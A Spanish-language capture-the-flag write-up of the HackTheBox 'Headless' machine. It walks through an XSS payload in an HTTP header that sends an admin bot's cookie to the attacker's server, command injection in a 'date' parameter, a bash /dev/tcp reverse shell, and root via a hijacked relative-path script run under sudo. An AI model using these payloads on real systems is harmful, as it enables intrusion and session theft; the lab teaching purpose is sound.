# Headless — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Headless](https://app.hackthebox.com/machines/Headless) |
| **Plataforma** | [HackTheBox](https://app.hackthebox.com/) |
| **Sistema Operativo** | Linux (Debian) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se lanza un escaneo completo con Nmap para descubrir servicios activos:

```bash
nmap -p- -sCV -T5 --open -vvv -oN Headless 10.129.9.199
```

![Nmap Scan](images/01_nmap_scan.jpg)

Puertos abiertos:
- **Puerto 22** — SSH (OpenSSH 9.2p1, Debian)
- **Puerto 5000** — HTTP (Werkzeug 2.2.2, Python 3.11.2)

---

## Enumeración Web

Al acceder al puerto 5000 desde el navegador se muestra una página "Under Construction" con un contador regresivo de 24 días:

![Web Home](images/02_web_home.jpg)

El botón "For questions" redirige al endpoint `/support`, que muestra un formulario de contacto con campos de nombre, apellido, email, teléfono y mensaje:

![Support Form](images/03_support_form.jpg)

### Fuzzing de directorios

Con la cookie de administrador obtenida más adelante, se lanza **ffuf** para descubrir rutas adicionales:

```bash
ffuf -u http://10.129.9.199:5000/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -t 100 \
  -b "is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"
```

![Ffuf](images/12_ffuf.jpg)

Se confirman dos endpoints: `/support` y `/dashboard`. El panel `/dashboard` devuelve 401 Unauthorized sin la cookie correcta:

![Dashboard 401](images/13_dashboard_401.jpg)

---

## Explotación — XSS con robo de cookie

### Descubrimiento del XSS

Se prueba inyección de código JavaScript en el campo `Message` del formulario `/support`:

```
<script>alert(1)</script>
```

![XSS Test](images/04_xss_test.jpg)

La aplicación detecta el intento y devuelve una página "Hacking Attempt Detected" que refleja todos los headers de la petición sin sanitizar, incluyendo el valor de las cookies:

![Hacking Detected](images/05_hacking_detected.jpg)

Esto indica que hay un proceso automatizado (bot/headless browser) que revisa las peticiones marcadas y renderiza su contenido. Si se inyecta JavaScript en las cabeceras HTTP, se ejecutará en el contexto del administrador.

### Captura de la petición con Burp Suite

Se intercepta la petición POST al formulario con **Burp Suite**:

![Burp Request](images/06_burp_request.jpg)

### Prueba de inyección en header

Antes de enviar el payload real, se verifica que un header personalizado `HTB` también se refleja en la respuesta enviando un valor de prueba:

![Burp HTB Test](images/07_burp_htb_test.jpg)

Se añade el payload XSS en el header `HTB`:

```
HTB: <script>var i=new Image();i.src="http://10.10.14.137/?c="+document.cookie;</script>
```

![Burp XSS Header](images/08_burp_xss_header.jpg)

Para confirmar visualmente que el XSS se ejecuta, se abre la respuesta directamente en el navegador desde el menú contextual de Burp:

![Open In Browser](images/09_open_in_browser.jpg)

El navegador ejecuta el `alert(1)` de prueba, confirmando la ejecución de JavaScript:

![XSS Alert](images/10_xss_alert.jpg)

### Servidor HTTP del atacante y robo de cookie

Se levanta un servidor HTTP en la máquina atacante para recibir la solicitud del bot con la cookie:

```bash
python3 -m http.server 80
```

Se envía la petición con el payload de robo de cookie desde Burp Repeater. El servidor recibe la petición del bot administrador con la cookie:

```
GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1
```

![Cookie Stolen](images/11_cookie_stolen.jpg)

---

## Acceso Inicial — Command Injection en /dashboard

### Acceso al panel de administración

Con la cookie robada se accede al panel `/dashboard`. Se puede ver la cookie en las DevTools del navegador y confirmar que el acceso es correcto:

![Dashboard Cookies](images/14_dashboard_cookies.jpg)

El panel muestra un formulario para generar reportes de salud del sistema con un selector de fecha:

![Dashboard](images/15_dashboard.jpg)

### Inyección de comandos

Se intercepta la petición POST con Burp Suite. El parámetro `date` no está sanitizado y permite encadenar comandos con `;`. Al enviar `date=;ls`, la respuesta muestra los ficheros de la aplicación:

```
app.py  dashboard.html  hackattempt.html  hacking_reports  index.html  inspect_reports.py  report.sh  support.html
```

![Command Injection LS](images/16_command_injection_ls.jpg)

### Reverse shell

Se configura un listener con Netcat:

```bash
nc -lvnp 90
```

Se inyecta una reverse shell en el parámetro `date`:

```
date=;bash -c 'bash -i >%26 /dev/tcp/10.10.14.137/90 0>%261'
```

![Reverse Shell](images/17_reverse_shell.jpg)

Se obtiene acceso como el usuario **dvir**.

### Flag de usuario

```bash
ls ~/app
cd ~
ls
cat user.txt
```

![User Flag](images/18_user_flag.jpg)

---

## Escalada de Privilegios

### Análisis del script syscheck

Se examina el contenido de `/usr/bin/syscheck`:

```bash
cat /usr/bin/syscheck
```

![Syscheck](images/19_syscheck.jpg)

El script comprueba si `initdb.sh` está corriendo y, si no lo está, lo ejecuta llamando a `./initdb.sh` — sin ruta absoluta. Esto significa que buscará el fichero en el **directorio de trabajo actual**, lo que permite hijacking.

### Enumeración de permisos sudo

Se comprueba qué puede ejecutar `dvir` con privilegios elevados:

```bash
sudo -l
```

![Sudo -l](images/20_sudo_l.jpg)

```
(ALL) NOPASSWD: /usr/bin/syscheck
```

El usuario puede ejecutar **syscheck** como root sin contraseña.

### Búsqueda de initdb.sh existente

Se verifica si existe algún `initdb.sh` en el sistema:

```bash
find / -name "initdb.sh" 2>/dev/null
```

![Find Initdb](images/21_find_initdb.jpg)

No existe ninguno, lo que confirma que se puede crear uno malicioso.

### Explotación — Hijacking de initdb.sh

Se crea un `initdb.sh` malicioso en `/tmp` que copia bash con el bit SUID activado, y se ejecuta `syscheck` desde ese directorio:

```bash
cd /tmp
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```

![Privesc Exploit](images/22_privesc_exploit.jpg)

Se confirma el bit SUID en `/tmp/rootbash` y se ejecuta con `-p` para preservar los privilegios de root:

```bash
ls -l /tmp/rootbash
/tmp/rootbash -p
id
# uid=1000(dvir) gid=1000(dvir) euid=0(root) groups=1000(dvir),100(users)
whoami
# root
```

![Root Shell](images/23_root_shell.jpg)

### Flag de root

```bash
cd /root
ls
cat root.txt
```

![Root Flag](images/24_root_flag.jpg)

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Enumeración web | Fuzzing de directorios | `ffuf` |
| Explotación | XSS via header HTTP | Burp Suite |
| Robo de sesión | Cookie hijacking | `python3 -m http.server` |
| Acceso inicial | Command Injection en parámetro `date` | Burp Suite / `nc` |
| Escalada | Hijacking de `initdb.sh` vía sudo sin ruta absoluta | `bash` |
